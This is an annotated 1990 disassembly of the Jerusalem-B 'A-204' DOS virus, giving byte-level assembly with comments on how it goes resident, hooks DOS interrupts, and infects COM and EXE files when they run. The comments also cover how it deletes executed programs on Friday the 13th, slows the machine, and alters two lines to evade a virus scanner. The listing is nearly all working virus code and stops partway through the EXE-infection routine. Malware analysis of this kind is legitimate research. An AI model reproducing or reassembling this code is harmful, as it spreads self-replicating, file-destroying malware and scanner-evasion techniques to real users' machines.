          Virus : Jerusalem Version B Variant A-204
Disassembled by : Righard Zwienenberg
                  Steenwijklaan 302
                  2541 RT  The Hague
                  The Netherlands
                  Data  : +31-70-3898822, V22,V22b,HST,MNP,CM
                  Voive : +31-70-3675379
FidoNet address : 2:512/2.3
  Used Software : ASMGEN, DEBUG and D86-Disassembler
           Date : 20 june 1990

Note : All Values are hex. If a value is followd by d (e.g. 30d) it means
30 decimal.

Note : This disassembly consists of two programs. The original program was
a dummy file (20h bytes long) containing 1Fh times 90 RET and 01h time 
C3 RET. 

0100 E9 92 00                JMP 0195		; JUMP -> 0195h

0103 db 2A,41,2D,32,30,34,2A 			; *A-204* never used

010A dw 00 01 ; Startaddress original program
010C dw 01 56 ; Startaddress-offset original program
010E db 00    ; Trigger for destruction (delete file)
              ; Always zero, but if it is Friday the 13th and the year is
              ; not equal 1987 this byte is set to one
010F dw 00 00 ; Storing place for original AX (read-only word)
0111 dw 20 00 ; Length of Original Program (0020h)
0113 dw A5 FE ; Storing place for original BX of INT 08h vector
0115 dw 00 F0 ; Storing place for original ES of INT 08h vector
0117 dw 60 14 ; Storing place for original BX of INT 21h vector
0119 dw 2B 02 ; Storing place for original ES of INT 21h vector
011B dw 56 05 ; Storing place for original BX of INT 24h vector
011D dw DE 0C ; Storing place for original ES of INT 24h vector
011F dw 40 7E ; Storing place for timer for 30 minutes trigger
              ; By init. set to 7E90h

              ; The following words are never used by the virus. The are used
              ; by a routine starting at 0398h which is executed when INT 21h
              ; is called with AH=DEh. This never happens in the code.
0121 dw 00 00 ;
0123 dw 00 00 ; 
0125 dw 00 00 ; 
0127 dw 00 00 ; 
0129 dw 00 00 ; 
012B dw 00 00 ; 
012D dw 00 E8 ; 
012F dw 06 EC ; 

0131 dw 91 16 ; Storing place for original ES
0133 dw 80 00 ; Storing place for BX. Never read again

0135 00 00 00 80 00

0139 dw 91 16 ; Storing place for original ES

013B 5C 00

013D dw 91 16 ; Storing place for original ES

013F 6C 00 ;

0141 dw 91 16 ; Temp. storing place for original ES
0143 dw 00 20 ; Temp. storing place for AX
0145 dw 0D 1F ; Temp. storing place for ES+10h
0147 dw 5F 21 ; Storing place for AX
0149 dw A1 16 ; Temp. storing place for ES+10h
014B dw 00 F0 ; Temp. storing place for AX
014D db 02    ; Temp. storing place for AL
014E db 00    ; COM/EXE indicator
              ; 0 = EXE-File
              ; 1 = COM-File
0151 dw 30 01 ; Temp. storing place for DX 
0153 dw 23 00 ; Temp. storing place for AX

0155 20 01 

0157 dw 4A 00 ; Read Only!!! The code only read this word to substract it
              ; from AX

0159 D4 06 D4 06

015D dw 98 03 ; Temp. Storing place to store AX
015F dw 10 07 ; Probably startaddress of virus in mem
0161 dw 84 19 ; Never used!!! 1984h is stored here by the code
0163 dw C5 00 ; 00C5h is being read and put back later by the code
0165 dw 99 03 ; Temp. storing place for AX

0167 1C 00 00 00 90 90 90 90 C3

0170 dw 05 00 ; Storing place for file handle (BX)
0172 dw 20 00 ; Storing place for file attributes
              ; bit 0 = read only
              ; bit 1 = hidden file
              ; bit 2 = system file
              ; bit 3 = volume label
              ; bit 4 = subdirectory
              ; bit 5 = archive bit
              ; bit 8 = shareable (Novell Network)
0174 dw D5 14 ; Storing place for file date (DX)
0176 dw 99 83 ; Storing place for file time (CX)
0178 dw 00 02 ; 0200h=512d Used as multiplier/divider
017A dw 10 00 ; 0001h=  1d Used as multiplier/divider
017C dw 20 3E ; Temp. storing place for AX
017E dw 00 00 ; Temp. storing place for DX
0180 dw B9 42 ; Storing place for DX of ASCIZ-Filename
0182 dw 1A 9B ; Storing place for DS of ASCIZ-Filename

0184 db 43,4F,4D,4D,41,4E,44,2E,43,4F,4D ; COMMAND.COM
                                         ; May not become infected

018F dw 01 00 ; Storing place for variable-result of free-memory-scan
              ; 0000h : not enough memory available 
              ; 0001h : enough memory available

0191 00 00 00 00 

0195 FC                      CLD		; Clear Direct
0196 B4 E0                   MOV AH,0E0		; This is the check if the
0198 CD 21                   INT 021		; virus is already active    
						; in memory. INT 21h with
						; AH=E0h will return AX=0300h
						; if the virus is active.
019A 80 FC E0		     CMP AH,0E0		; AH>=E0h?
019D 73 16		     JAE 01B5		; Yes: -> 01B5h  
019F 80 FC 03		     CMP AH,3		; AH<-03h?
01A2 72 11		     JB 01B5		; Yes: -> 01B5h
						; INT 21h with AH=
						; DDh,DEh,E0h
						; are self-defined.

						; SetUp for 
						; Executing original program 
						; We come here if an infected
						; program is executed and the
						; virus is already active in
						; memory.
01A4 B4 DD                   MOV AH,0DD         ;
01A6 BF 00 01                MOV DI,0100	; Destination Index = 0100h
01A9 BE 10 07                MOV SI,0710        ; Source Index = 0710h
01AC 03 F7                   ADD SI,DI		; Source Index:= 0810h
						; At this place the original
						; Program is located
01AE 2E 8B 8D 11 00          CS MOV CX,W[DI+011]; CX=20h (length original
						; Program)
01B3 CD 21                   INT 021		; 

						; Here we come when the virus
						; is not yet in memory
01B5 8C C8                   MOV AX,CS		; AX=Code Segment 
01B7 05 10 00                ADD AX,010		; AX:=AX+10h
01BA 8E D0                   MOV SS,AX		; Stack Segment:=AX
01BC BC 00 07                MOV SP,0700	; StackPointer = 0700h
01BF 50                      PUSH AX		; Store AX
01C0 B8 C5 00                MOV AX,0C5		; AX = C5h
01C3 50                      PUSH AX		; Store AX
01C4 CB                      RETF		; -> C5h

01C5 FC                      CLD		; Clear Direct
01C6 06                      PUSH ES		; Store ES
01C7 2E 8C 06 31 00          CS MOV W[031],ES	; Store ES 
01CC 2E 8C 06 39 00          CS MOV W[039],ES	; in storage places
01D1 2E 8C 06 3D 00          CS MOV W[03D],ES	;
01D6 2E 8C 06 41 00          CS MOV W[041],ES	;
01DB 8C C0                   MOV AX,ES		; AX=ES
01DD 05 10 00                ADD AX,010		; AX=AX+10h
01E0 2E 01 06 49 00          CS ADD W[049],AX	; Add AX (ES+10h) to 0149h
01E5 2E 01 06 45 00          CS ADD W[045],AX	; and 0145h
01EA B4 E0                   MOV AH,0E0		; AH=E0h (Self defined)
01EC CD 21                   INT 021		; CALL INT 21h

01EE 80 FC E0                CMP AH,0E0		; AH>=0Eh?
01F1 73 13                   JAE 0206		; Yes: -> 0206
01F3 80 FC 03                CMP AH,3		; AH=03h? Must be if the
						; viruscode is in memory
						; and interrupt 21h is called
						; with AH=E0h.

01F6 07                      POP ES		; Restore original ES
01F7 2E 8E 16 45 00          CS MOV SS,W[045]   ; SS=ES+10h
01FC 2E 8B 26 43 00          CS MOV SP,W[043]   ;
0201 2E FF 2E 47 00          CS JMP D[047]      ;

0206 33 C0                   XOR AX,AX		; AX=0000h
0208 8E C0                   MOV ES,AX		; ES=0000h
020A 26 A1 FC 03             ES MOV AX,W[03FC]

						; Here the A-204 variant 
						; differs for the first
						; time from the original
						; Jerusalem Version B virus.
020E 26 A0 FE 03             ES MOV AL,B[03FE]	; These two line have been
0212 2E A3 4B 00             CS MOV W[04B],AX	; changed in order
						; to avoid being
						; detected by ViruScan from
						; John McAfee.

0216 2E A2 4D 00             CS MOV B[04D],AL
021A 26 C7 06 FC 03 F3 A5    ES MOV W[03FC],0A5F3
0221 26 C6 06 FE 03 CB       ES MOV B[03FE],0CB
0227 58                      POP AX
0228 05 10 00                ADD AX,010
022B 8E C0                   MOV ES,AX
022D 0E                      PUSH CS		; Store CS
022E 1F                      POP DS		; DS=CS
022F B9 10 07                MOV CX,0710	; CX=0710h
0232 D1 E9                   SHR CX,1		; CX >> 1 (CX:=0308h)
0234 33 F6                   XOR SI,SI		; SI=0000h
0236 8B FE                   MOV DI,SI		; DI=0000h
0238 06                      PUSH ES		; Store ES
0239 B8 42 01                MOV AX,0142	; AX=0142h
023C 50                      PUSH AX		; Store AX
023D EA FC 03 00 00          JMP 0:03FC

0242 8C C8                   MOV AX,CS		; AX=CS
0244 8E D0                   MOV SS,AX		; SS=CS
0246 BC 00 07                MOV SP,0700	; SP=0700h
0249 33 C0                   XOR AX,AX		; AX=0000h
024B 8E D8                   MOV DS,AX		; DS=0000h
024D 2E A1 4B 00             CS MOV AX,W[04B]	; Restore AX
0251 A3 FC 03                MOV W[03FC],AX	; Store AX
0254 2E A0 4D 00             CS MOV AL,B[04D]	; Restore AL
0258 A2 FE 03                MOV B[03FE],AL	; Store AL
025B 8B DC                   MOV BX,SP		; BX=SP
025D B1 04                   MOV CL,4		; CL=04h
025F D3 EB                   SHR BX,CL		; BX >> 4
0261 83 C3 10                ADD BX,010		; BX=BX+10h
0264 2E 89 1E 33 00          CS MOV W[033],BX	; Store BX. Why I don't know,
						; the storing place is never
						; read again
0269 B4 4A                   MOV AH,04A		; 
026B 2E 8E 06 31 00          CS MOV ES,W[031]	; Restore ES
0270 CD 21                   INT 021		; Adjust Memory Block Size
						; (SETBLOCK)

0272 B8 21 35                MOV AX,03521	; Get original INT 21h
0275 CD 21                   INT 021		; vector

0277 2E 89 1E 17 00          CS MOV W[017],BX	; Store BX and ES of INT 21h
027C 2E 8C 06 19 00          CS MOV W[019],ES	; vector
0281 0E                      PUSH CS		; Store CS
0282 1F                      POP DS		; DS=CS
0283 BA 5B 02                MOV DX,025B	; DX=025Bh
0286 B8 21 25                MOV AX,02521   	; Set new INT 21h
0289 CD 21                   INT 021		; vector on DS:025Bh

028B 8E 06 31 00             MOV ES,W[031]	; Restore original ES
028F 26 8E 06 2C 00          ES MOV ES,W[02C]	;
0294 33 FF                   XOR DI,DI		; DI=0000h
0296 B9 FF 7F                MOV CX,07FFF	; CX=7FFFh
0299 32 C0                   XOR AL,AL		; AL=0000h
029B F2 AE                   REPNE SCASB	; 
029D 26 38 05                ES CMP B[DI],AL	;
02A0 E0 F9                   LOOPNE 029B	; No Flags: DEC CX -> 02A2h
						; IF CX<>0 and not equal
						; -> 029B
02A2 8B D7                   MOV DX,DI		; DX=DI
02A4 83 C2 03                ADD DX,3		; DX=DX+03h
02A7 B8 00 4B                MOV AX,04B00	; AX=4B00h
02AA 06                      PUSH ES		; Store ES
02AB 1F                      POP DS		; Restore DS (DS:=ES)
02AC 0E                      PUSH CS		; Store CS
02AD 07                      POP ES		; Restore ES (ES:=CS)
02AE BB 35 00                MOV BX,035		; BX=35h
02B1 1E                      PUSH DS		; Store Registers
02B2 06                      PUSH ES
02B3 50                      PUSH AX
02B4 53                      PUSH BX
02B5 51                      PUSH CX
02B6 52                      PUSH DX

02B7 B4 2A                   MOV AH,02A 	; Get Current Date
02B9 CD 21                   INT 021		; DL=day
						; DH=month
						; CX=year
						; AL=Day of the week

02BB 2E C6 06 0E 00 00       CS MOV B[0E],0	; Set Trigger for deleting
						; infected files to 00h
02C1 81 F9 C3 07             CMP CX,07C3	; Is year 1987 ?
02C5 74 30                   JE 02F7		; Yes: -> 02F7h
02C7 3C 05                   CMP AL,5		; Is it Friday ?
02C9 75 0D                   JNE 02D8		; No: -> 02D8h
02CB 80 FA 0D                CMP DL,0D		; Is it 13th ?
02CE 75 08                   JNE 02D8		; No: -> 02D8h
						; Yes: it is Friday
						; the 13th and the
						; year is not equal 1987
02D0 2E FE 06 0E 00          CS INC B[0E]	; Set Trigger for deleting
						; infected files to 01h
02D5 EB 20                   JMP 02F7		; JUMP -> 02F7h

02D7 90                      NOP

02D8 B8 08 35                MOV AX,03508	; Get original INT 8h
02DB CD 21                   INT 021		; vector

02DD 2E 89 1E 13 00          CS MOV W[013],BX	; Store original BX
02E2 2E 8C 06 15 00          CS MOV W[015],ES	; and ES of INT 08h vector
02E7 0E                      PUSH CS
02E8 1F                      POP DS
02E9 C7 06 1F 00 90 7E       MOV W[01F],07E90	; Store 30d minutes into
						; timer interrupt. This
						; value is decreased by
						; one 18.2 times per second
02EF B8 08 25                MOV AX,02508	; Set new INT 8h vector
02F2 BA 1E 02                MOV DX,021E	; to DS:021Eh
02F5 CD 21                   INT 021		; 

02F7 5A                      POP DX		; Restore Registers
02F8 59                      POP CX
02F9 5B                      POP BX
02FA 58                      POP AX
02FB 07                      POP ES
02FC 1F                      POP DS
02FD 9C                      PUSHF		; Store Flags
02FE 2E FF 1E 17 00          CS CALL D[017]	; Call original INT 21h
						; address

0303 1E                      PUSH DS		; Restore DS
0304 07                      POP ES		; Store ES
0305 B4 49                   MOV AH,049		; Free Memory
0307 CD 21                   INT 021		;

0309 B4 4D                   MOV AH,04D		; Get ExitCode of
030B CD 21                   INT 021		; SubProgram (WAIT) 
						; Stored in AL

030D B4 31                   MOV AH,031		; AX=31[AL]h
030F BA 00 06                MOV DX,0600	; DX=600h
0312 B1 04                   MOV CL,4		; CL=04h
0314 D3 EA                   SHR DX,CL		; DX >> 4 (DX=60H)
0316 83 C2 10                ADD DX,010		; DX=DX+10h (DX=70h)
						; Program Size in Paragraphs
						; is 70h Bytes
0319 CD 21                   INT 021		; Terminate but Stay Resident

031B 32 C0                   XOR AL,AL		; Clear AL
031D CF                      IRET		; Interrupt Return

						; 031Eh is the new INT 08h
						; vector. This routine is
						; called 18.2 times per
						; second
031E 2E 83 3E 1F 00 02       CS CMP W[01F],2	; Timer decreased til 02h?
0324 75 17                   JNE 033D		; No: -> 033D
	
						; Yes: now 32 minutes are
						; passed since infection
0326 50                      PUSH AX		; Store Registers
0327 53                      PUSH BX
0328 51                      PUSH CX
0329 52                      PUSH DX
032A 55                      PUSH BP

032B B8 02 06                MOV AX,0602	; Scroll box with coordinates
032E B7 87                   MOV BH,087		; (5h,5h),(10h,10h) two
0330 B9 05 05                MOV CX,0505	; lines upwards
0333 BA 10 10                MOV DX,01010	; 
0336 CD 10                   INT 010		; 

0338 5D                      POP BP		; Restore Registers
0339 5A                      POP DX
033A 59                      POP CX
033B 5B                      POP BX
033C 58                      POP AX
033D 2E FF 0E 1F 00          CS DEC W[01F]	; Decrease Timer-Trigger
						; This now becomes 01h
0342 75 12                   JNE 0356		; If 0: -> 0356h
0344 2E C7 06 1F 00 01 00    CS MOV W[01F],1	; Timer-Trigger set to 01h
034B 50                      PUSH AX		; Store AX
034C 51                      PUSH CX		; Store CX
034D 56                      PUSH SI		; Store SI
034E B9 01 40                MOV CX,04001	; CX=4001h
0351 F3 AC                   REP LODSB		; Load byte [SI] into AL and
						; advance SI, done CX times.
						; This is the routine which 
						; decreases the speed of the
						; machine til 1/5th of the
						; original. 32 minutes after
						; infection this routine is
						; executes 18.2 times a second
0353 5E                      POP SI		; Restore SI
0354 59                      POP CX		; Restore CX
0355 58                      POP AX		; Restore AX
0356 2E FF 2E 13 00          CS JMP D[013]	; Jump to original INT 08h
						; address

						; Here we come if INT 21h is 
						; called
035B 9C                      PUSHF		; Store Flags
035C 80 FC E0                CMP AH,0E0		; AH=0Eh ?
035F 75 05                   JNE 0366		; No: -> 0366h
0361 B8 00 03                MOV AX,0300	; AX=0300h
0364 9D                      POPF		; Restore Flags
0365 CF                      IRET		; Interrupt Return

0366 80 FC DD                CMP AH,0DD		; AH=DDh?
0369 74 13                   JE 037E		; Yes: -> 037Eh
036B 80 FC DE                CMP AH,0DE		; AH=DEh?
036E 74 28                   JE 0398		; Yes: -> 0398h
						; INT 21h is never called
						; with AH=DEh. So the routine
						; at 0398h is never used
						; (seems)

0370 3D 00 4B                CMP AX,04B00	; Load & Execute ? 
0373 75 03                   JNE 0378		; No: -> 0378h
0375 E9 B4 00                JMP 042C		; Yes: -> 042Ch
0378 9D                      POPF		; Restore Flags
0379 2E FF 2E 17 00          CS JMP D[017]	; Jmp to original
						; INT 21h address

						; Execute original program
037E 58                      POP AX
037F 58                      POP AX		; Restore AX
0380 B8 00 01                MOV AX,0100	; AX=0100h
0383 2E A3 0A 00             CS MOV W[0A],AX	; Store AX
0387 58                      POP AX		; Restore AX
0388 2E A3 0C 00             CS MOV W[0C],AX	; Store AX
038C F3 A4                   REP MOVSB		;
038E 9D                      POPF		; Restore Flags
038F 2E A1 0F 00             CS MOV AX,W[0F]	; AX=0000h
0393 2E FF 2E 0A 00          CS JMP D[0A]	; JUMP -> CS:0100h
						; This executes the original
						; program


						; This routine is called
						; when INT 21h with AH=DEh
						; is called which never
						; happens in the code. I
						; have to investigate it 
						; a bit more. Til then
						; it remains without comments.
0398 83 C4 06                ADD SP,6
039B 9D                      POPF
039C 8C C8                   MOV AX,CS
039E 8E D0                   MOV SS,AX
03A0 BC 10 07                MOV SP,0710
03A3 06                      PUSH ES
03A4 06                      PUSH ES
03A5 33 FF                   XOR DI,DI	
03A7 0E                      PUSH CS
03A8 07                      POP ES
03A9 B9 10 00                MOV CX,010
03AC 8B F3                   MOV SI,BX
03AE BF 21 00                MOV DI,021
03B1 F3 A4                   REP MOVSB
03B3 8C D8                   MOV AX,DS
03B5 8E C0                   MOV ES,AX
03B7 2E F7 26 7A 00          CS MUL W[07A]
03BC 2E 03 06 2B 00          CS ADD AX,W[02B]
03C1 83 D2 00                ADC DX,0
03C4 2E F7 36 7A 00          CS DIV W[07A]
03C9 8E D8                   MOV DS,AX
03CB 8B F2                   MOV SI,DX
03CD 8B FA                   MOV DI,DX
03CF 8C C5                   MOV BP,ES
03D1 2E 8B 1E 2F 00          CS MOV BX,W[02F]
03D6 0B DB                   OR BX,BX
03D8 74 13                   JE 03ED
03DA B9 00 80                MOV CX,08000
03DD F3 A5                   REP MOVSW
03DF 05 00 10                ADD AX,01000
03E2 81 C5 00 10             ADD BP,01000
03E6 8E D8                   MOV DS,AX
03E8 8E C5                   MOV ES,BP
03EA 4B                      DEC BX
03EB 75 ED                   JNE 03DA
03ED 2E 8B 0E 2D 00          CS MOV CX,W[02D]
03F2 F3 A4                   REP MOVSB
03F4 58                      POP AX	
03F5 50                      PUSH AX	
03F6 05 10 00                ADD AX,010
03F9 2E 01 06 29 00          CS ADD W[029],AX
03FE 2E 01 06 25 00          CS ADD W[025],AX
0403 2E A1 21 00             CS MOV AX,W[021]
0407 1F                      POP DS	
0408 07                      POP ES	
0409 2E 8E 16 29 00          CS MOV SS,W[029]
040E 2E 8B 26 27 00          CS MOV SP,W[027]
0413 2E FF 2E 23 00          CS JMP D[023]

			     			; We come here if B[0Eh]=1,
						; which means Friday 13th,
						; year<>1987. This routine						
						; deletes the loaded file.
0418 33 C9                   XOR CX,CX		; Clear all bits of the File
						; Attribute
041A B8 01 43                MOV AX,04301	; 
041D CD 21                   INT 021		; Put File Atributes

041F B4 41                   MOV AH,041		;
0421 CD 21                   INT 021		; Delete a File (Unlink)

0423 B8 00 4B                MOV AX,04B00

0426 9D                      POPF		; Get Flags
0427 2E FF 2E 17 00          CS JMP D[017]

						; We come here each time a
						; file is loaded with the
						; load and execute call
						; (INT 21h, AX=4B00h)
042C 2E 80 3E 0E 00 01       CS CMP B[0E],1     ; Is it Friday 13th,
						; year<>1987?
0432 74 E4                   JE 0418		; Yes: -> 0418h
0434 2E C7 06 70 00 FF FF    CS MOV W[070],-1	; File Handle -1 ???
043B 2E C7 06 8F 00 00 00    CS MOV W[08F],0	; Clear Memory-Available
						; variable
0442 2E 89 16 80 00          CS MOV W[080],DX	; DS:DX -> ASCIZ Filename,
0447 2E 8C 1E 82 00          CS MOV W[082],DS	; Store DX and DS
044C 50                      PUSH AX
044D 53                      PUSH BX
044E 51                      PUSH CX
044F 52                      PUSH DX
0450 56                      PUSH SI
0451 57                      PUSH DI
0452 1E                      PUSH DS
0453 06                      PUSH ES
0454 FC                      CLD
0455 8B FA                   MOV DI,DX		; 
0457 32 D2                   XOR DL,DL		; DL=00h : Take Default Drive
0459 80 7D 01 3A             CMP B[DI+1],03A	; ':' at 2nd place in ASCIZ-
						; filename
045D 75 05                   JNE 0464		; No: -> 0464h
045F 8A 15                   MOV DL,B[DI]	; Get Drive Letter
0461 80 E2 1F                AND DL,01F		; Get Drive Code
						; 0 = Default
						; 1 = A
						; 2 = B, etc.
0464 B4 36                   MOV AH,036		;
0466 CD 21                   INT 021		; Get disk space
						; BX=# of available clusters
						; CX=Bytes per sector
						; DX=Total clusters

0468 3D FF FF                CMP AX,-1		; No Sectors Free?
046B 75 03                   JNE 0470		; No: -> 0470h
046D E9 77 02                JMP 06E7		; Yes: -> 06E7h


0470 F7 E3                   MUL BX		; Calculate Free Space
0472 F7 E1                   MUL CX		;
0474 0B D2                   OR DX,DX		;
0476 75 05                   JNE 047D		; 
0478 3D 10 07                CMP AX,0710	; 1808 Bytes Free?
047B 72 F0                   JB 046D		; No: -> 046Dh
047D 2E 8B 16 80 00          CS MOV DX,W[080]	; Restore DX's ASCIZ Filename
0482 1E                      PUSH DS
0483 07                      POP ES
0484 32 C0                   XOR AL,AL		; AL=00h
0486 B9 41 00                MOV CX,041		;
0489 F2 AE                   REPNE SCASB	; Check if filename
048B 2E 8B 36 80 00          CS MOV SI,W[080]	; is in UPPERCASE
0490 8A 04                   MOV AL,B[SI]	;
0492 0A C0                   OR AL,AL		; All UPPERRCASE?
0494 74 0E                   JE 04A4		; IF so: -> 04A4h
0496 3C 61                   CMP AL,061		; AL<'a' ?
0498 72 07                   JB 04A1		; Yes: -> 04A1h
049A 3C 7A                   CMP AL,07A		; AL>'z' ?
049C 77 03                   JA 04A1		; Yes: -> 04A1h
049E 80 2C 20                SUB B[SI],020	; Transfer filename
						; into UPPERCASE
04A1 46                      INC SI		; SI=SI+1
04A2 EB EC                   JMP 0490

04A4 B9 0B 00                MOV CX,0B		; CX=0Bh
04A7 2B F1                   SUB SI,CX		; Return SI to start
						; of Filename
04A9 BF 84 00                MOV DI,084		; Start of COMMAND.COM 
						; filename
04AC 0E                      PUSH CS
04AD 07                      POP ES
04AE B9 0B 00                MOV CX,0B
04B1 F3 A6                   REPE CMPSB		; Filename=COMMAND.COM ?
04B3 75 03                   JNE 04B8		; No: -> 04B8h
04B5 E9 2F 02                JMP 06E7		; Yes: -> 06E7h

						; We come here if the 
						; loaded program is not
						; COMMAND.COM
04B8 B8 00 43                MOV AX,04300 	; 
04BB CD 21                   INT 021		; Get File Attributes

04BD 72 05                   JB 04C4		; If Error: -> 04C4h
04BF 2E 89 0E 72 00          CS MOV W[072],CX	; Store File Attributes
04C4 72 25                   JB 04EB		; If Error: -> 04EBh
04C6 32 C0                   XOR AL,AL		; AL=00h
04C8 2E A2 4E 00             CS MOV B[04E],AL	; Dummy=0
04CC 1E                      PUSH DS		;
04CD 07                      POP ES		;
04CE 8B FA                   MOV DI,DX		; 
04D0 B9 41 00                MOV CX,041		;
04D3 F2 AE                   REPNE SCASB	;
04D5 80 7D FE 4D             CMP B[DI-2],04D	; "M" ?
04D9 74 0B                   JE 04E6		; Yes: -> 04E6h
04DB 80 7D FE 6D             CMP B[DI-2],06D	; "m" ?
04DF 74 05                   JE 04E6		; Yes: -> 04E6h
04E1 2E FE 06 4E 00          CS INC B[04E]	; Dummy=Dummy+1
04E6 B8 00 3D                MOV AX,03D00	; Open Disk File with
04E9 CD 21                   INT 021		; handle in compatibility
						; mode
						; DS:DX : -> ASCIZ Filename

04EB 72 5A                   JB 0547		; IF Error: -> 0547h
04ED 2E A3 70 00             CS MOV W[070],AX	; Store File Handle
04F1 8B D8                   MOV BX,AX		; BX=File Handle
04F3 B8 02 42                MOV AX,04202	; Move File Read/Write
						; Pointer (LSEEK) with
						; offset from end of file
04F6 B9 FF FF                MOV CX,-1		; CX:DX = offset in bytes
04F9 BA FB FF                MOV DX,-5		; 
04FC CD 21                   INT 021		;
						; DX:AX = new absolute
						; offset from beginning of
						; file

04FE 72 EB                   JB 04EB		; If Error: -> 04EBh
0500 05 05 00                ADD AX,5		; ????
0503 2E A3 11 00             CS MOV W[011],AX	; Store Length of File

0507 B9 05 00                MOV CX,5		; Read from a file with
050A BA 6B 00                MOV DX,06B		; handle BX 5h bytes into
050D 8C C8                   MOV AX,CS		; DS:DX buffer
050F 8E D8                   MOV DS,AX		;
0511 8E C0                   MOV ES,AX		;
0513 B4 3F                   MOV AH,03F		;
0515 CD 21                   INT 021		;

0517 8B FA                   MOV DI,DX		; DI=DX=6Bh
0519 BE 05 00                MOV SI,5		; SI=05h
051C F3 A6                   REPE CMPSB		; Check first 5 bytes to see
						; if a file already is
						; infected
051E 75 07                   JNE 0527		; If not: -> 0527h
0520 B4 3E                   MOV AH,03E		; Close a file with
0522 CD 21                   INT 021		; handle

0524 E9 C0 01                JMP 06E7		; Jump -> 06E7h

0527 B8 24 35                MOV AX,03524	; Get original int 24h
052A CD 21                   INT 021		; vector. Stored in ES:BX

052C 89 1E 1B 00             MOV W[01B],BX      ; Store BX of INT 24h vector
0530 8C 06 1D 00             MOV W[01D],ES	; Store ES of INT 24h vector
0534 BA 1B 02                MOV DX,021B	; Set new int 24h vector
0537 B8 24 25                MOV AX,02524	; to DS:DX 
053A CD 21                   INT 021		;

053C C5 16 80 00             LDS DX,[080]	; DS:DX=Filename
0540 33 C9                   XOR CX,CX		; Get fileattributes
0542 B8 01 43                MOV AX,04301	; Put File Attributes
0545 CD 21                   INT 021		; (CHMOD)

0547 72 3B                   JB 0584		; If Error: -> 0584h
0549 2E 8B 1E 70 00          CS MOV BX,W[070]   ; Close a file with 
054E B4 3E                   MOV AH,03E		; handle BX
0550 CD 21                   INT 021		; 

0552 2E C7 06 70 00 FF FF    CS MOV W[070],-1	; File Handle=-1 ???
0559 B8 02 3D                MOV AX,03D02	; Open File with 
055C CD 21                   INT 021		; Handle in READ/WRITE mode

055E 72 24                   JB 0584		; If Error: -> 0584h
0560 2E A3 70 00             CS MOV W[070],AX	; Store File Handle
0564 8C C8                   MOV AX,CS
0566 8E D8                   MOV DS,AX
0568 8E C0                   MOV ES,AX

056A 8B 1E 70 00             MOV BX,W[070]	; BX=File Handle
056E B8 00 57                MOV AX,05700	; Get File' date/time-
0571 CD 21                   INT 021		; stamp

0573 89 16 74 00             MOV W[074],DX	; Move File Read/Write Pointer
0577 89 0E 76 00             MOV W[076],CX	; (LSEEK) with offset from 
057B B8 00 42                MOV AX,04200	; beginning of file with 
057E 33 C9                   XOR CX,CX		; CX:DX bytes
0580 8B D1                   MOV DX,CX		; 
0582 CD 21                   INT 021		; 

0584 72 3D                   JB 05C3		; If Error: -> 05C3h
0586 80 3E 4E 00 00          CMP B[04E],0	; '0'?
058B 74 03                   JE 0590		; Yes: -> 0590h
058D EB 57                   JMP 05E6		; JUMP -> 05E6h

058F 90                      NOP

0590 BB 00 10                MOV BX,01000	; Number of 16d-byte para-
						; graphs BX=1000h For COM-
						; files there are 1000h 16d
						; bytes paragrahs available
0593 B4 48                   MOV AH,048		; 
0595 CD 21                   INT 021		; Allocate Memory

0597 73 0B                   JAE 05A4		; If enough memory available
						; -> 05A4h
0599 B4 3E                   MOV AH,03E		; Close a file with
059B 8B 1E 70 00             MOV BX,W[070]	; handle BX
059F CD 21                   INT 021		; 

05A1 E9 43 01                JMP 06E7		; JUMP -> 06E7h

05A4 FF 06 8F 00             INC W[08F]		; Set Memory-Available
						; Variable (0001h)
05A8 8E C0                   MOV ES,AX		;
05AA 33 F6                   XOR SI,SI		; SI=0000h
05AC 8B FE                   MOV DI,SI		; DI=0000h
05AE B9 10 07                MOV CX,0710	; CX=0710h (1808d)
						; length of virus
05B1 F3 A4                   REP MOVSB		; Put virus code at begin-
						; ning of buffer ES:DI
05B3 8B D7                   MOV DX,DI		; DX=DI=0710h
05B5 8B 0E 11 00             MOV CX,W[011]	; Restore Length of File 
05B9 8B 1E 70 00             MOV BX,W[070]	; Restore File Handle
05BD 06                      PUSH ES		; Read from a file with 
05BE 1F                      POP DS		; handle CX (length
05BF B4 3F                   MOV AH,03F		; of file) bytes in buffer
05C1 CD 21                   INT 021		; DS:DX

05C3 72 1C                   JB 05E1		; If Error: -> 05E1h
05C5 03 F9                   ADD DI,CX		; DI=Length of original
						; file+0710h (length of
						; viruscode)+05h
05C7 33 C9                   XOR CX,CX		; CX=0000h
05C9 8B D1                   MOV DX,CX		; Move file read/write
05CB B8 00 42                MOV AX,04200	; pointer with offset from
05CE CD 21                   INT 021		; beginning of file

05D0 BE 05 00                MOV SI,5		; 
05D3 B9 05 00                MOV CX,5		;
05D6 F3 2E A4                REP CS MOVSB	;
05D9 8B CF                   MOV CX,DI		; CX=0715h(1813d)+length of
						; original code
05DB 33 D2                   XOR DX,DX		; DX=0000h
05DD B4 40                   MOV AH,040		; Write to file with handle
05DF CD 21                   INT 021		; CX bytes

05E1 72 0D                   JB 05F0		; If Error: -> 05F0h
05E3 E9 BC 00                JMP 06A2		; JUMP -> 06A2h

05E6 B9 1C 00                MOV CX,01C		; Read CX (1Ch) bytes from
05E9 BA 4F 00                MOV DX,04F		; file with handle
05EC B4 3F                   MOV AH,03F		;
05EE CD 21                   INT 021		;

05F0 72 4A                   JB 063C		; If Error: -> 063Ch
05F2 C7 06 61 00 84 19       MOV W[061],01984	; Store 1984h=6532d
05F8 A1 5D 00                MOV AX,W[05D]	; 
05FB A3 45 00                MOV W[045],AX	; 
05FE A1 5F 00                MOV AX,W[05F]	; 
0601 A3 43 00                MOV W[043],AX	; 
0604 A1 63 00                MOV AX,W[063]	;
0607 A3 47 00                MOV W[047],AX	;
060A A1 65 00                MOV AX,W[065]	;
060D A3 49 00                MOV W[049],AX	;
0610 A1 53 00                MOV AX,W[053]	;
0613 83 3E 51 00 00          CMP W[051],0	; '0000'?
0618 74 01                   JE 061B		; Yes: -> 061Bh
061A 48                      DEC AX		; AX=AX-01h
061B F7 26 78 00             MUL W[078]		;
061F 03 06 51 00             ADD AX,W[051]	;
0623 83 D2 00                ADC DX,0		;
0626 05 0F 00                ADD AX,0F		;
0629 83 D2 00                ADC DX,0		;
062C 25 F0 FF                AND AX,-010	;
062F A3 7C 00                MOV W[07C],AX	; Store AX
0632 89 16 7E 00             MOV W[07E],DX	; Store DX
0636 05 10 07                ADD AX,0710	; AX=AX+1808
0639 83 D2 00                ADC DX,0		;
063C 72 3A                   JB 0678		; If Error :-> 0678h
